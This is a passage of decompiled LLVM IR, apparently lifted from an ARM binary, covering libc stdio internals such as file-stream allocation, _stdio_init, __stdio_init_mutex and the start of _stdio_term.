  store i32 80, i32* %r0.global-to-local, align 4
  %v1_aff4 = call i32 @malloc(i32 80)
  store i32 %v1_aff4, i32* %r0.global-to-local, align 4
  store i32 %v1_aff4, i32* @r8, align 4
  %v3_aff8 = icmp eq i32 %v1_aff4, 0
  store i1 %v3_aff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aff8, label %dec_label_pc_b21c, label %dec_label_pc_b000

dec_label_pc_b000:                                ; preds = %dec_label_pc_aff0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* @r3, align 4
  %v3_b008 = add i32 %v1_aff4, 1
  %v4_b008 = inttoptr i32 %v3_b008 to i8*
  store i8 32, i8* %v4_b008, align 1
  %v0_b00c = load i32, i32* %r2.global-to-local, align 4
  %v1_b00c = load i32, i32* @r8, align 4
  %v2_b00c = add i32 %v1_b00c, 8
  %v3_b00c = inttoptr i32 %v2_b00c to i32*
  store i32 %v0_b00c, i32* %v3_b00c, align 4
  %v0_b010 = load i32, i32* %r2.global-to-local, align 4
  %v1_b010 = trunc i32 %v0_b010 to i8
  %v2_b010 = load i32, i32* @r8, align 4
  %v3_b010 = inttoptr i32 %v2_b010 to i8*
  store i8 %v1_b010, i8* %v3_b010, align 1
  %v0_b014 = load i32, i32* @r8, align 4
  %v1_b014 = add i32 %v0_b014, 56
  store i32 %v1_b014, i32* @r0, align 4
  %v0_b018 = call i32 @__stdio_init_mutex()
  store i32 %v0_b018, i32* %r0.global-to-local, align 4
  %v0_b01c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b01c

dec_label_pc_b01c:                                ; preds = %.thread4, %dec_label_pc_b000
  %v0_b074 = phi i32 [ %v0_af78, %.thread4 ], [ %v0_b01c.pre, %dec_label_pc_b000 ]
  %v1_b01c = icmp slt i32 %v0_b074, 0
  %v2_b01c = icmp eq i32 %v0_b074, 0
  store i1 %v2_b01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_b01c, label %dec_label_pc_b074, label %dec_label_pc_b024

dec_label_pc_b024:                                ; preds = %dec_label_pc_b01c
  %v0_b028 = load i32, i32* @r4, align 4
  %v2_b028 = and i32 %v0_b028, 131075
  %v1_b02c = add nuw nsw i32 %v2_b028, 1
  store i32 %v1_b02c, i32* %r2.global-to-local, align 4
  %v0_b030 = load i32, i32* @r6, align 4
  %v1_b030 = add i32 %v0_b030, 1
  %v2_b034 = and i32 %v1_b030, %v1_b02c
  store i32 %v2_b034, i32* %r3.global-to-local, align 4
  %v9_b038 = icmp eq i32 %v2_b034, %v1_b02c
  store i1 %v9_b038, i1* %cpsr_z.global-to-local, align 1
  %v1_b03c = load i32, i32* @r8, align 4
  %v2_b03c = add i32 %v1_b03c, 4
  %v3_b03c = inttoptr i32 %v2_b03c to i32*
  store i32 %v0_b074, i32* %v3_b03c, align 4
  br i1 %v9_b038, label %dec_label_pc_b044, label %dec_label_pc_af98

dec_label_pc_b044:                                ; preds = %dec_label_pc_b024
  %v0_b044 = load i32, i32* @r4, align 4
  %v1_b044 = load i32, i32* @r6, align 4
  %v2_b044 = sub i32 -1, %v1_b044
  %v3_b044 = and i32 %v0_b044, %v2_b044
  store i32 %v3_b044, i32* %r3.global-to-local, align 4
  %v1_b048 = and i32 %v3_b044, 1024
  %v2_b048 = icmp eq i32 %v1_b048, 0
  store i1 %v2_b048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b048, label %dec_label_pc_b068, label %dec_label_pc_b050

dec_label_pc_b050:                                ; preds = %dec_label_pc_b044
  %v0_b050 = load i32, i32* @r5, align 4
  store i32 %v0_b050, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_b05c = call i32 @__libc_fcntl(i32 %v0_b050, i32 4)
  store i32 %v2_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v2_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b060, label %dec_label_pc_b050.dec_label_pc_b068_crit_edge, label %dec_label_pc_af98

dec_label_pc_b050.dec_label_pc_b068_crit_edge:    ; preds = %dec_label_pc_b050
  %v0_b068.pre = load i32, i32* @r6, align 4
  %v0_b06c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b068

dec_label_pc_b068:                                ; preds = %dec_label_pc_b050.dec_label_pc_b068_crit_edge, %dec_label_pc_b044
  %v0_b06c = phi i32 [ %v0_b06c.pre, %dec_label_pc_b050.dec_label_pc_b068_crit_edge ], [ %v0_b044, %dec_label_pc_b044 ]
  %v0_b068 = phi i32 [ %v0_b068.pre, %dec_label_pc_b050.dec_label_pc_b068_crit_edge ], [ %v1_b044, %dec_label_pc_b044 ]
  %v1_b068 = and i32 %v0_b068, 131072
  store i32 %v1_b068, i32* %r3.global-to-local, align 4
  %v2_b06c = or i32 %v1_b068, %v0_b06c
  store i32 %v2_b06c, i32* @r4, align 4
  br label %dec_label_pc_b098

dec_label_pc_b074:                                ; preds = %dec_label_pc_b01c
  %v7_b074 = icmp eq i32 %v0_b074, -1
  store i1 %v7_b074, i1* %cpsr_z.global-to-local, align 1
  %v0_b080.pre = load i32, i32* @r4, align 4
  br i1 %v7_b074, label %dec_label_pc_b074._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_b074
  %v2_b078 = or i32 %v0_b080.pre, 131072
  store i32 %v2_b078, i32* @r4, align 4
  br label %dec_label_pc_b074._crit_edge

dec_label_pc_b074._crit_edge:                     ; preds = %dec_label_pc_b074, %bb34
  %v0_b080 = phi i32 [ %v2_b078, %bb34 ], [ %v0_b080.pre, %dec_label_pc_b074 ]
  %v0_b07c = load i32, i32* @r6, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  store i32 %v0_b080, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_b088 = inttoptr i32 %v0_b07c to i8*
  %v3_b088 = call i32 @__libc_open(i8* %v2_b088, i32 %v0_b080)
  store i32 %v3_b088, i32* %r0.global-to-local, align 4
  %v1_b08c = icmp slt i32 %v3_b088, 0
  %v2_b08c = icmp eq i32 %v3_b088, 0
  store i1 %v2_b08c, i1* %cpsr_z.global-to-local, align 1
  %v1_b090 = load i32, i32* @r8, align 4
  %v2_b090 = add i32 %v1_b090, 4
  %v3_b090 = inttoptr i32 %v2_b090 to i32*
  store i32 %v3_b088, i32* %v3_b090, align 4
  br i1 %v1_b08c, label %dec_label_pc_afac, label %dec_label_pc_b098

dec_label_pc_b098:                                ; preds = %dec_label_pc_b074._crit_edge, %dec_label_pc_b068
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = inttoptr i32 %v0_b098 to i32*
  %v2_b098 = load i32, i32* %v1_b098, align 4
  %v1_b09c = and i32 %v2_b098, 8192
  store i32 %v1_b09c, i32* %r3.global-to-local, align 4
  %v3_b0a01 = udiv i32 %v1_b09c, 256
  store i32 %v3_b0a01, i32* %r2.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v3_b0a01 to i8
  %v3_b0a4 = add i32 %v0_b098, 1
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r8, align 4
  %v3_b0a8 = inttoptr i32 %v2_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v3_b0a8, align 1
  %v0_b0ac = load i32, i32* @r4, align 4
  %v1_b0ac = and i32 %v0_b0ac, 131072
  store i32 %v1_b0ac, i32* %r1.global-to-local, align 4
  %v2_b0ac = icmp eq i32 %v1_b0ac, 0
  store i1 %v2_b0ac, i1* %cpsr_z.global-to-local, align 1
  %v0_b0b0 = load i32, i32* @r8, align 4
  %v1_b0b0 = add i32 %v0_b0b0, 1
  %v2_b0b0 = inttoptr i32 %v1_b0b0 to i8*
  %v3_b0b0 = load i8, i8* %v2_b0b0, align 1
  %v4_b0b0 = zext i8 %v3_b0b0 to i32
  %v1_b0b4 = inttoptr i32 %v0_b0b0 to i8*
  %v2_b0b4 = load i8, i8* %v1_b0b4, align 1
  %v3_b0b4 = zext i8 %v2_b0b4 to i32
  store i32 %v3_b0b4, i32* %r3.global-to-local, align 4
  br i1 %v2_b0ac, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_b098
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_b098, %bb35
  %v0_b0c8 = phi i32 [ 0, %dec_label_pc_b098 ], [ 32768, %bb35 ]
  %v1_b0bc = and i32 %v0_b0ac, 1024
  store i32 %v1_b0bc, i32* %r0.global-to-local, align 4
  %v4_b0c4 = mul nuw nsw i32 %v4_b0b0, 256
  %v5_b0c4 = or i32 %v3_b0b4, %v4_b0c4
  %v2_b0c8 = or i32 %v0_b0c8, %v1_b0bc
  store i32 %v2_b0c8, i32* %r1.global-to-local, align 4
  %v2_b0d0 = or i32 %v5_b0c4, %v2_b0c8
  %v1_b0c0 = mul i32 %v0_b0ac, 16
  %v1_b0cc = and i32 %v1_b0c0, 48
  %v1_b0d4 = add nuw nsw i32 %v1_b0cc, 16
  %v4_b0d8 = xor i32 %v1_b0d4, 48
  %v5_b0d8 = or i32 %v2_b0d0, %v4_b0d8
  store i32 %v5_b0d8, i32* %r3.global-to-local, align 4
  %v3_b0dc19 = udiv i32 %v2_b0d0, 256
  store i32 %v3_b0dc19, i32* %r2.global-to-local, align 4
  %v1_b0e0 = trunc i32 %v3_b0dc19 to i8
  store i8 %v1_b0e0, i8* %v2_b0b0, align 1
  %v0_b0e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0e4 = trunc i32 %v0_b0e4 to i8
  %v2_b0e4 = load i32, i32* @r8, align 4
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i8*
  store i8 %v1_b0e4, i8* %v3_b0e4, align 1
  %v0_b0e8 = call i32 @__errno_location()
  store i32 %v0_b0e8, i32* %r0.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r8, align 4
  %v1_b0ec = add i32 %v0_b0ec, 1
  %v2_b0ec = inttoptr i32 %v1_b0ec to i8*
  %v3_b0ec = load i8, i8* %v2_b0ec, align 1
  %v4_b0ec = zext i8 %v3_b0ec to i32
  store i32 %v4_b0ec, i32* %r3.global-to-local, align 4
  %v1_b0f0 = inttoptr i32 %v0_b0ec to i8*
  %v2_b0f0 = load i8, i8* %v1_b0f0, align 1
  %v3_b0f0 = zext i8 %v2_b0f0 to i32
  store i32 %v0_b0e8, i32* @r6, align 4
  %v1_b0f8 = add i32 %v0_b0ec, 4
  %v2_b0f8 = inttoptr i32 %v1_b0f8 to i32*
  %v3_b0f8 = load i32, i32* %v2_b0f8, align 4
  store i32 %v3_b0f8, i32* @r0, align 4
  %v4_b0fc = mul nuw nsw i32 %v4_b0ec, 256
  %v5_b0fc = or i32 %v3_b0f0, %v4_b0fc
  store i32 %v5_b0fc, i32* @r4, align 4
  %v1_b100 = inttoptr i32 %v0_b0e8 to i32*
  %v2_b100 = load i32, i32* %v1_b100, align 4
  store i32 %v2_b100, i32* @r5, align 4
  %v1_b104 = call i32 @isatty(i32 %v3_b0f8)
  store i32 %v1_b104, i32* %r0.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  %v4_b108 = mul i32 %v1_b104, 256
  %v5_b108 = or i32 %v0_b108, %v4_b108
  store i32 %v5_b108, i32* @r4, align 4
  %v3_b10c = sdiv i32 %v5_b108, 256
  store i32 %v3_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = trunc i32 %v3_b10c to i8
  %v2_b110 = load i32, i32* @r8, align 4
  %v3_b110 = add i32 %v2_b110, 1
  %v4_b110 = inttoptr i32 %v3_b110 to i8*
  store i8 %v1_b110, i8* %v4_b110, align 1
  %v0_b114 = load i32, i32* @r4, align 4
  %v1_b114 = trunc i32 %v0_b114 to i8
  %v2_b114 = load i32, i32* @r8, align 4
  %v3_b114 = inttoptr i32 %v2_b114 to i8*
  store i8 %v1_b114, i8* %v3_b114, align 1
  %v0_b118 = load i32, i32* @r5, align 4
  %v1_b118 = load i32, i32* @r6, align 4
  %v2_b118 = inttoptr i32 %v1_b118 to i32*
  store i32 %v0_b118, i32* %v2_b118, align 4
  %v0_b11c = load i32, i32* @r8, align 4
  %v1_b11c = add i32 %v0_b11c, 8
  %v2_b11c = inttoptr i32 %v1_b11c to i32*
  %v3_b11c = load i32, i32* %v2_b11c, align 4
  store i32 %v3_b11c, i32* %r3.global-to-local, align 4
  %v2_b120 = icmp eq i32 %v3_b11c, 0
  store i1 %v2_b120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b120, label %dec_label_pc_b128, label %bb37

dec_label_pc_b128:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_b12c = call i32 @malloc(i32 4096)
  store i32 %v1_b12c, i32* %r0.global-to-local, align 4
  %v2_b130 = icmp eq i32 %v1_b12c, 0
  store i1 %v2_b130, i1* %cpsr_z.global-to-local, align 1
  %v1_b144.pre = load i32, i32* @r8, align 4
  br i1 %v2_b130, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_b128
  %v2_b14420 = add i32 %v1_b144.pre, 8
  %v3_b14421 = inttoptr i32 %v2_b14420 to i32*
  store i32 0, i32* %v3_b14421, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_b128
  %v2_b134 = inttoptr i32 %v1_b144.pre to i32*
  %v3_b134 = load i32, i32* %v2_b134, align 4
  %v2_b138 = or i32 %v3_b134, 16384
  store i32 %v2_b138, i32* %r3.global-to-local, align 4
  %v2_b13c = add i32 %v1_b12c, 4096
  store i32 %v2_b13c, i32* %r2.global-to-local, align 4
  %v4_b140 = sdiv i32 %v2_b138, 256
  store i32 %v4_b140, i32* %r1.global-to-local, align 4
  %v2_b144 = add i32 %v1_b144.pre, 8
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v1_b12c, i32* %v3_b144, align 4
  %v1_b148 = load i32, i32* %r2.global-to-local, align 4
  %v2_b148 = load i32, i32* @r8, align 4
  %v3_b148 = add i32 %v2_b148, 12
  %v4_b148 = inttoptr i32 %v3_b148 to i32*
  store i32 %v1_b148, i32* %v4_b148, align 4
  %v1_b14c = load i32, i32* %r1.global-to-local, align 4
  %v2_b14c = trunc i32 %v1_b14c to i8
  %v3_b14c = load i32, i32* @r8, align 4
  %v4_b14c = add i32 %v3_b14c, 1
  %v5_b14c = inttoptr i32 %v4_b14c to i8*
  store i8 %v2_b14c, i8* %v5_b14c, align 1
  %v0_b150.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b150.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_b150 = load i32, i32* %r3.global-to-local, align 4
  %v2_b150 = trunc i32 %v1_b150 to i8
  %v3_b150 = load i32, i32* @r8, align 4
  %v4_b150 = inttoptr i32 %v3_b150 to i8*
  store i8 %v2_b150, i8* %v4_b150, align 1
  %v0_b154.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b154.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_b154 = load i32, i32* @r8, align 4
  %v3_b154 = add i32 %v2_b154, 12
  %v4_b154 = inttoptr i32 %v3_b154 to i32*
  store i32 %v1_b12c, i32* %v4_b154, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d4bc.421 to i32), i32* %r3.global-to-local, align 4
  %v2_b160 = load i32, i32* @r8, align 4
  %v3_b160 = add i32 %v2_b160, 2
  %v4_b160 = inttoptr i32 %v3_b160 to i8*
  store i8 0, i8* %v4_b160, align 1
  %v0_b164 = load i32, i32* @r8, align 4
  %v1_b164 = add i32 %v0_b164, 1
  %v2_b164 = inttoptr i32 %v1_b164 to i8*
  %v3_b164 = load i8, i8* %v2_b164, align 1
  %v4_b164 = zext i8 %v3_b164 to i32
  store i32 %v4_b164, i32* %r2.global-to-local, align 4
  %v2_b168 = load i32, i32* @global_var_1d4bc.421, align 4
  store i32 %v2_b168, i32* %r1.global-to-local, align 4
  %v1_b16c = add i32 %v0_b164, 8
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  store i32 %v3_b16c, i32* %r3.global-to-local, align 4
  %v1_b170 = and i32 %v4_b164, 32
  %v2_b170 = icmp eq i32 %v1_b170, 0
  store i1 %v2_b170, i1* %cpsr_z.global-to-local, align 1
  %v2_b174 = add i32 %v0_b164, 20
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v3_b16c, i32* %v3_b174, align 4
  %v0_b178 = load i32, i32* %r0.global-to-local, align 4
  %v1_b178 = load i32, i32* @r8, align 4
  %v2_b178 = add i32 %v1_b178, 44
  %v3_b178 = inttoptr i32 %v2_b178 to i32*
  store i32 %v0_b178, i32* %v3_b178, align 4
  %v0_b17c = load i32, i32* %r1.global-to-local, align 4
  %v1_b17c = load i32, i32* @r8, align 4
  %v2_b17c = add i32 %v1_b17c, 52
  %v3_b17c = inttoptr i32 %v2_b17c to i32*
  store i32 %v0_b17c, i32* %v3_b17c, align 4
  %v0_b180 = load i32, i32* %r3.global-to-local, align 4
  %v1_b180 = load i32, i32* @r8, align 4
  %v2_b180 = add i32 %v1_b180, 24
  %v3_b180 = inttoptr i32 %v2_b180 to i32*
  store i32 %v0_b180, i32* %v3_b180, align 4
  %v0_b184 = load i32, i32* %r3.global-to-local, align 4
  %v1_b184 = load i32, i32* @r8, align 4
  %v2_b184 = add i32 %v1_b184, 28
  %v3_b184 = inttoptr i32 %v2_b184 to i32*
  store i32 %v0_b184, i32* %v3_b184, align 4
  %v0_b188 = load i32, i32* %r3.global-to-local, align 4
  %v1_b188 = load i32, i32* @r8, align 4
  %v2_b188 = add i32 %v1_b188, 16
  %v3_b188 = inttoptr i32 %v2_b188 to i32*
  store i32 %v0_b188, i32* %v3_b188, align 4
  br i1 %v2_b170, label %dec_label_pc_b21c, label %dec_label_pc_b190

dec_label_pc_b190:                                ; preds = %bb37
  %v2_b190 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_b190, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d4a4.408 to i32), i32* %r2.global-to-local, align 4
  %v1_b1a8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1d4a4.408 to i32), i32* %r0.global-to-local, align 4
  %v1_b1b8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1d48c.427 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_af6c, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_e55c.404 to i32), i32* %r1.global-to-local, align 4
  %v1_b1cc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1d48c.427 to i32), i32* %r0.global-to-local, align 4
  %v1_b1d8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r2.global-to-local, align 4
  %v2_b1e0 = load i32, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  store i32 %v2_b1e0, i32* %r3.global-to-local, align 4
  store i32 %v2_af6c, i32* @r0, align 4
  %v1_b1e8 = load i32, i32* @r8, align 4
  %v2_b1e8 = add i32 %v1_b1e8, 32
  %v3_b1e8 = inttoptr i32 %v2_b1e8 to i32*
  store i32 %v2_b1e0, i32* %v3_b1e8, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_b1f4 = load i32, i32* @r8, align 4
  %v1_b1f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b1f4 = inttoptr i32 %v1_b1f4 to i32*
  store i32 %v0_b1f4, i32* %v2_b1f4, align 4
  %v1_b1fc = call i32 @__pthread_return_void()
  store i32 %v2_b190, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 45588, i32* @lr, align 4
  %v1_b210 = call i32 @__pthread_return_void()
  store i32 %v1_b210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b21c

dec_label_pc_b218:                                ; preds = %dec_label_pc_afac, %dec_label_pc_af98, %dec_label_pc_afb8
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_b21c

dec_label_pc_b21c:                                ; preds = %bb37, %dec_label_pc_aff0, %dec_label_pc_b190, %dec_label_pc_b218
  %v0_b21c = load i32, i32* @r8, align 4
  store i32 %v0_b21c, i32* %r0.global-to-local, align 4
  %v2_b224 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b224, i32* @r4, align 4
  store i32 %v6_af60, i32* @r5, align 4
  store i32 %v9_af60, i32* @r6, align 4
  store i32 %v15_af60, i32* @r8, align 4
  ret i32 %v0_b21c

; uselistorder directives
  uselistorder i32 %v1_b144.pre, { 1, 0, 2 }
  uselistorder i32 %v3_b10c, { 1, 0 }
  uselistorder i32 %v3_b0a01, { 1, 0 }
  uselistorder i32 %v0_b080, { 1, 0 }
  uselistorder i1 %v7_b074, { 1, 0 }
  uselistorder i32 %v1_b044, { 1, 0 }
  uselistorder i32 %v0_b044, { 1, 0 }
  uselistorder i32 %v1_b02c, { 1, 0, 2 }
  uselistorder i32 %v1_afe0, { 1, 0 }
  uselistorder i1 %v7_af8c, { 1, 0 }
  uselistorder i1 %v7_af80, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 21, 22 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder label %dec_label_pc_b21c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_b218, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_b074._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_b01c, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_afc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af98, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b228:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_b228 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b228, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_b228
  %v3_b230 = and i32 %arg4, %arg3
  store i32 %v3_b230, i32* %r0.global-to-local, align 4
  %v2_b234 = trunc i32 %v3_b230 to i16
  %v4_b234 = inttoptr i32 %v3_b230 to i16*
  store i16 %v2_b234, i16* %v4_b234, align 2
  %v5_b234 = load i32, i32* @r6, align 4
  %v6_b234 = load i32, i32* %r0.global-to-local, align 4
  %v7_b234 = sub i32 %v6_b234, %v5_b234
  store i32 %v7_b234, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_b228, %bb
  %v8_b234 = phi i32 [ %tmp, %dec_label_pc_b228 ], [ %v7_b234, %bb ]
  ret i32 %v8_b234

; uselistorder directives
  uselistorder i32 %v3_b230, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b258 = load i32, i32* @r4, align 4
  store i32 %v3_b258, i32* %stack_var_-24, align 4
  %v9_b258 = load i32, i32* @r6, align 4
  %v0_b25c = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_1d4c0.398 to i32), i32* @r4, align 4
  %v3_b264 = load i8, i8* @global_var_1d4c1.433, align 1
  %v4_b264 = zext i8 %v3_b264 to i32
  %v2_b268 = load i8, i8* bitcast (i8** @global_var_1d4c0.398 to i8*), align 4
  %v3_b268 = zext i8 %v2_b268 to i32
  store i32 %v0_b25c, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_b274 = mul nuw nsw i32 %v4_b264, 256
  %v5_b274 = or i32 %v3_b268, %v4_b274
  store i32 %v5_b274, i32* @r6, align 4
  %v1_b278 = inttoptr i32 %v0_b25c to i32*
  %v2_b278 = load i32, i32* %v1_b278, align 4
  store i32 %v2_b278, i32* %r8.global-to-local, align 4
  %v1_b27c = call i32 @isatty(i32 0)
  %v1_b280 = sub i32 1, %v1_b27c
  %v0_b284 = load i32, i32* @r6, align 4
  %v4_b284 = mul i32 %v1_b280, 256
  %v5_b284 = xor i32 %v4_b284, %v0_b284
  %v3_b288 = load i8, i8* @global_var_1d511.434, align 1
  %v4_b288 = zext i8 %v3_b288 to i32
  %v3_b28c = load i8, i8* @global_var_1d510.399, align 1
  %v4_b28c = zext i8 %v3_b28c to i32
  %v3_b290 = sdiv i32 %v5_b284, 256
  store i32 1, i32* @r0, align 4
  %v4_b298 = mul nuw nsw i32 %v4_b288, 256
  %v5_b298 = or i32 %v4_b28c, %v4_b298
  store i32 %v5_b298, i32* @r5, align 4
  %v1_b29c = trunc i32 %v3_b290 to i8
  store i8 %v1_b29c, i8* @global_var_1d4c1.433, align 1
  %v1_b2a0 = trunc i32 %v0_b284 to i8
  %v2_b2a0 = load i32, i32* @r4, align 4
  %v3_b2a0 = inttoptr i32 %v2_b2a0 to i8*
  store i8 %v1_b2a0, i8* %v3_b2a0, align 1
  %v1_b2a4 = call i32 @isatty(i32 1)
  %v1_b2a8 = sub i32 1, %v1_b2a4
  %v0_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = mul i32 %v1_b2a8, 256
  %v5_b2ac = xor i32 %v4_b2ac, %v0_b2ac
  store i32 %v5_b2ac, i32* %r5.global-to-local, align 4
  %v3_b2b0 = sdiv i32 %v5_b2ac, 256
  %v1_b2b4 = trunc i32 %v3_b2b0 to i8
  store i8 %v1_b2b4, i8* @global_var_1d511.434, align 1
  %v0_b2b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_b2b8 = load i32, i32* @r7, align 4
  %v2_b2b8 = inttoptr i32 %v1_b2b8 to i32*
  store i32 %v0_b2b8, i32* %v2_b2b8, align 4
  %v0_b2bc = load i32, i32* %r5.global-to-local, align 4
  %v1_b2bc = trunc i32 %v0_b2bc to i8
  store i8 %v1_b2bc, i8* @global_var_1d510.399, align 1
  %v2_b2c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b2c0, i32* @r4, align 4
  store i32 %v9_b258, i32* @r6, align 4
  ret i32 %v1_b2a8

; uselistorder directives
  uselistorder i32 %v1_b2a8, { 1, 0 }
  uselistorder i32 %v0_b284, { 1, 0 }
  uselistorder i8* @global_var_1d510.399, { 1, 0 }
  uselistorder i8* @global_var_1d511.434, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_1d4c1.433, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_136fc.436 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_b2d0 = call i32 @memcpy()
  %v0_b2d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b2d4, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_b2d4 = load i32, i32* @r3, align 4
  %v3_b2d4 = load i32, i32* @r1, align 4
  %v4_b2d4 = inttoptr i32 %v3_b2d4 to i32*
  store i32 %v1_b2d4, i32* %v4_b2d4, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_b2d0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b2d8 = load i32, i32* @r4, align 4
  store i32 %v3_b2d8, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1d48c.427 to i32), i32* @r0, align 4
  %v0_b2e0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1d4a4.408 to i32), i32* @r0, align 4
  %v0_b2e8 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_1d488.430 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1d488.430 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_b3446 = add i32 %storemerge5, 56
  store i32 %v1_b3446, i32* @r5, align 4
  %v2_b3488 = icmp eq i32 %storemerge5, 0
  store i32 %v1_b3446, i32* %r0.global-to-local, align 4
  br i1 %v2_b3488, label %dec_label_pc_b354, label %dec_label_pc_b2f8

dec_label_pc_b2f8:                                ; preds = %entry, %dec_label_pc_b334
